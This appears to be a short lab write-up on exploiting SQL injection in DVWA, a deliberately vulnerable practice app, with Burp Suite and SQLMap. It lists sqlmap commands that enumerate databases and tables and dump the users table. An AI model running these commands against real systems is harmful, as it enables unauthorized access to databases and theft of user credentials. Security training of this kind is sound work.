# SQL Injection (DVWA using Burp Suite & SQLMap)
## Objective

To identify and exploit SQL Injection vulnerability in DVWA using Burp Suite and SQLMap.

## Tools Used
 - Docker
 - DVWA (Security Level: Low)
 - Burp Suite
 - SQLMap
   

## Procedure

- DVWA security level set to Low and database initialized.
- SQL Injection request captured using Burp Suite Proxy.
- Captured request saved as sqli.txt.
- SQLMap used in batch mode to test and exploit SQL Injection.

## Commands Used(screenshots attached)

      sqlmap -r sqli.txt --batch
      sqlmap -r sqli.txt --batch --dbs
      sqlmap -r sqli.txt --batch -D dvwa --tables
      sqlmap -r sqli.txt --batch -D dvwa -T users --dump

## Result

SQL Injection vulnerability confirmed.
Database names, tables, and user data extracted successfully.

## Impact

- Unauthorized access to database
- Exposure of sensitive user credentials

## Conclusion

This task demonstrates how SQL Injection vulnerabilities can be exploited using captured HTTP requests and automated tools like SQLMap.
